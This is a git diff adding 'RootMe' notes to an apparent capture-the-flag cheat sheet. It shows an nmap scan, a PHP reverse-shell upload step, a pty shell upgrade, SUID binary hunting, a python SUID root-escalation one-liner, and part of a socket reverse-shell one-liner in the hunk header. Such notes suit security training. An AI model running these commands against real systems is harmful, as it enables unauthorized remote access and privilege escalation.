@@ -59,3 +59,27 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 # show authority on current dir
 sudo -l
 ```
+
+## RootMe
+
+```bash
+# -sS: stealthly scan
+# -sV: version detection
+# -oN: output a log
+sudo nmap -sS -sV -oN nmap.log {target IP}
+
+# upload the reverse shell script
+# https://github.com/pentestmonkey/php-reverse-shell
+
+# execute this script for upgrade the reverse shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+find / -type f -user root -perm -4000 2>/dev/null
+
+find / -user root -perm /4000 -type f 2>/dev/null
+
+# escalate the priviledge
+# ref) https://gtfobins.github.io/gtfobins/python/#suid
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
